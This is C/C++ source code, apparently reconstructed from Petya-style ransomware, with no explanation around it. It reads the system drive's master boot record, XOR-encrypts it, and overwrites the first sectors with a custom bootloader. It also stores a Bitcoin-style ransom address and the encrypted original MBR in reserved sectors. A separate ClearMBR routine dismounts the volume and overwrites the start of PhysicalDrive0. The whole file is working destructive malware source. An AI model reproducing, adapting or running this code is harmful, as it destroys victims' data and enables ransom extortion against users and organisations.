DWORD GetSystemDirectoryDeviceID(char *pszOut)
{
	DWORD dwRet = 0;
	char szSystemPath[MAX_PATH] = { 0 };
	char szSrc[MAX_PATH] = "\\\\.\\PhysicalDrive";
	char szDstBuf[32] = { 0 };
	VOLUME_DISK_EXTENTS  tagDiskInfo = { 0 };
	char szFileName[12] = "\\\\.\\0:";
	DWORD dwBytesReturned = 0;

	memset(pszOut, 0, MAX_PATH);

	if (0 != GetSystemDirectoryA(szSystemPath, MAX_PATH))
	{
		szFileName[4] = szSystemPath[0];
		HANDLE hFile = CreateFileA(szFileName, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (INVALID_HANDLE_VALUE != hFile)
		{
			if (FALSE != DeviceIoControl(hFile, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, NULL, 0, &tagDiskInfo, sizeof(VOLUME_DISK_EXTENTS), &dwBytesReturned, NULL))
			{
				_itoa(tagDiskInfo.Extents[0].DiskNumber, szDstBuf, 10);
				int nSrcSize = strlen(szSrc);
				int nDstSize = strlen(szDstBuf);
				if ((nSrcSize + nDstSize + 1) > MAX_PATH)
				{
					dwRet = 0x8007007A;
				}
				else if (nSrcSize > 0)
				{
					if (nSrcSize > 259)
					{
						nSrcSize = 259;
					}

					strcpy(pszOut, szSrc);
				}
				if (nDstSize > 0
					&& (nSrcSize + strlen(pszOut)) <= MAX_PATH)
				{
					strcat(pszOut, szDstBuf);
				}
			}
			else
			{
				dwRet = GetLastError();
				dwRet = dwRet & 0xffff | 0x80070000;
			}
			CloseHandle(hFile);
		}
		else
		{
			dwRet = GetLastError();
			dwRet = dwRet & 0xffff | 0x80070000;
		}
	}
	else
	{
		dwRet = GetLastError();
		dwRet = dwRet & 0xffff | 0x80070000;
	}
	return dwRet;
}


DWORD GetVolumeStartOffset(char *pszDeviceIdPath, DWORD &dwStartOffset)
{
	DWORD dwByteReturned = 0;
	DWORD dwRet = 0;
	BYTE aryDiskPartionInfo[0x90];
	if (NULL != pszDeviceIdPath)
	{
		HANDLE hFile = CreateFileA(pszDeviceIdPath, SYNCHRONIZE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (INVALID_HANDLE_VALUE != hFile)
		{
			if (FALSE == DeviceIoControl(hFile, IOCTL_DISK_GET_PARTITION_INFO_EX, NULL, 0, aryDiskPartionInfo, 0x90, &dwByteReturned, NULL))
			{
				dwRet = GetLastError();
				dwRet = dwRet & 0xffff | 0x80070000;
			}
			dwStartOffset = ((PARTITION_INFORMATION_EX*)&aryDiskPartionInfo)->StartingOffset.LowPart;
			CloseHandle(hFile);
		}
		else
		{
			dwRet = GetLastError();
			dwRet = dwRet & 0xffff | 0x80070000;
		}
	}
	else
	{
		dwRet = 0x80070057;
	}
	return dwRet;
}


DWORD Read512Data(char *pszDeviceIdPath, BYTE *pOut)
{
	DWORD dwNumberOfBytesRead = 0;
	DWORD dwRet = 0;

	if (NULL != pszDeviceIdPath)
	{
		memset(pOut, 0, 512);
		HANDLE hFile = CreateFileA(pszDeviceIdPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if (INVALID_HANDLE_VALUE != hFile)
		{
			LARGE_INTEGER lSetPos;
			lSetPos.LowPart = 0;
			lSetPos.HighPart = 0;
			if (0 != SetFilePointerEx(hFile, lSetPos, 0, FILE_BEGIN))
			{
				if (FALSE == ReadFile(hFile, pOut, 512, &dwNumberOfBytesRead, NULL))
				{
					dwRet = GetLastError() & 0xffff | 0x80070000;
				}
			}
			else
			{
				dwRet = GetLastError() & 0xffff | 0x80070000;
			}

			CloseHandle(hFile);
		}
		else
		{
			dwRet = GetLastError() & 0xffff | 0x80070000;
		}
	}
	else
	{
		dwRet = 0x80070057;
	}
	return dwRet;
}


DWORD WriteDiskData(DWORD dwSectorIndex, char *pszDeviceIdPath, BYTE *pWriteData)
{
	DWORD dwNumberOfBytesWritten = 0;
	DWORD dwRet = 0;
	if (NULL != pszDeviceIdPath)
	{
		HANDLE hFile = CreateFileA(pszDeviceIdPath, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (INVALID_HANDLE_VALUE != hFile)
		{
			LARGE_INTEGER lFilePos;
			lFilePos.QuadPart = dwSectorIndex * 512;
			if (SetFilePointerEx(hFile, lFilePos, NULL, FILE_BEGIN))
			{
				if (!WriteFile(hFile, pWriteData, 512, &dwNumberOfBytesWritten, NULL))
				{
					dwRet = GetLastError() & 0xffff | 0x80070000;
				}
			}
			else
			{
				dwRet = GetLastError() & 0xffff | 0x80070000;
			}

			CloseHandle(hFile);
		}
		else
		{
			dwRet = GetLastError() & 0xffff | 0x80070000;
		}
	}
	else
	{
		dwRet = 0x80070057;
	}

	return dwRet;
}


DWORD _OverlayMBR()
{
	char szSystemDeviceIDPath[MAX_PATH] = { 0 };
	MBR tagReadMBR;
	BYTE szBuffer[512] = { 0 };
	BYTE aryOldMbrDecryptKey[512] = { 0 };
	BYTE aryEncryptMBR[512] = { 0 };
	BYTE aryBuffer[60] = { 0 };
	char szSrc[60] = { 0 };
	DWORD dwVolumeStartOffset = 0;
	g_dwError = GetSystemDirectoryDeviceID(szSystemDeviceIDPath);
	if (NT_SUCCESS(g_dwError))
	{
		g_dwError = GetVolumeStartOffset(szSystemDeviceIDPath, dwVolumeStartOffset);
		if (NT_SUCCESS(g_dwError))
		{
			if (0 == dwVolumeStartOffset)
			{
				g_dwError = RandByteAry(szBuffer, 60);
				if (NT_SUCCESS(g_dwError))
				{
					for (int i = 0; i < 60; i++)
					{
						szSrc[i] = g_szCharTable[szBuffer[i] % 58];
					}

					g_dwError = Read512Data(szSystemDeviceIDPath, (BYTE*)&tagReadMBR);
					if (NT_SUCCESS(g_dwError))
					{
						DP* pDp = tagReadMBR.Dpt;
						int nIndex = 0;
						for (int i = 0; i < 4; i++)
						{
							if (pDp[i].SectorsPreceding != 0
								&& pDp[i].SectorsPreceding <= -1)
							{
								nIndex = pDp[i].SectorsPreceding;
							}
						}

						if (-1 == nIndex)
						{
							nIndex = 0;
						}

						if (nIndex <= 0x28)
						{
							g_dwError = 0x80070272;
						}
						else
						{
							memcpy(aryEncryptMBR, &tagReadMBR, 512);
							for (int i = 0; i < 512; i++)
							{
								aryEncryptMBR[i] ^= 7;
							}

							memset(aryOldMbrDecryptKey, 7, 512);
							g_dwError = RandByteAry(szBuffer, 32);
							if (NT_SUCCESS(g_dwError))
							{
								g_dwError = RandByteAry(szBuffer + 33, 8);
								if (NT_SUCCESS(g_dwError))
								{
									strcpy((char*)szBuffer + 41, "1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX");
									DWORD dwSrcLen = strlen(szSrc);
									if (dwSrcLen != 0)
									{
										if (dwSrcLen > 342)
										{
											dwSrcLen = 342;
										}

										memcpy(szBuffer + 169, szSrc, dwSrcLen);
										szBuffer[169 + dwSrcLen] = 0;
									}

									MBR *pNewMBR = new MBR;
									memcpy(pNewMBR, g_aryNewMBR, 512);
									BYTE *pMbrCode = new BYTE[8881];
									memcpy(pMbrCode, g_aryMbrCode, 8881);
									BYTE *pNewDiskData = new BYTE[9728];//19
									memcpy(pNewDiskData, pNewMBR, 512);
									MBR *pWriteMBR = (MBR*)pNewDiskData;
									memcpy(pWriteMBR->ulSigned, tagReadMBR.ulSigned, 4);
									memcpy(pWriteMBR->sReserve, tagReadMBR.sReserve, 2);
									for (int i = 0; i < 4; i++)
									{
										memcpy(&pWriteMBR->Dpt[i], &tagReadMBR.Dpt[i], sizeof(DP));
									}

									memcpy(pNewDiskData + sizeof(MBR), pMbrCode, 8881);

									for (int i = 0; i < 19; i++)
									{
										g_dwError = WriteDiskData(i, szSystemDeviceIDPath, pNewDiskData + i * 512);
										if (!NT_SUCCESS(g_dwError))
										{
											break;
										}
									}

									if (NT_SUCCESS(g_dwError))
									{
										g_dwError = WriteDiskData(0x20, szSystemDeviceIDPath, szBuffer);
										if (NT_SUCCESS(g_dwError))
										{
											g_dwError = WriteDiskData(0x21, szSystemDeviceIDPath, aryOldMbrDecryptKey);
											if (NT_SUCCESS(g_dwError))
											{
												g_dwError = WriteDiskData(0x22, szSystemDeviceIDPath, aryEncryptMBR);
											}
										}
									}

									delete pNewMBR;
									delete[]pMbrCode;
									delete[]pNewDiskData;
								}
							}
						}
					}
				}
			}
			else
			{
				g_dwError = 0x80070032;
			}
		}
	}
	return FALSE;
}

BOOL ClearMBR()
{
	DISK_GEOMETRY tagDiskInfo;
	DWORD dwBytesReturned = 0;
	BOOL bRet = FALSE;
	HANDLE hFile = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (INVALID_HANDLE_VALUE != hFile)
	{
		DeviceIoControl(hFile, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &tagDiskInfo, sizeof(DISK_GEOMETRY), &dwBytesReturned, NULL);

		LPVOID lpBuffer = LocalAlloc(LMEM_FIXED, tagDiskInfo.BytesPerSector * 10);
		if (NULL != lpBuffer)
		{
			DeviceIoControl(hFile, FSCTL_DISMOUNT_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
			WriteFile(hFile, lpBuffer, tagDiskInfo.BytesPerSector * 10, &dwBytesReturned, NULL);
			LocalFree(lpBuffer);
		}

		CloseHandle(hFile);
	}
	return bRet;
}

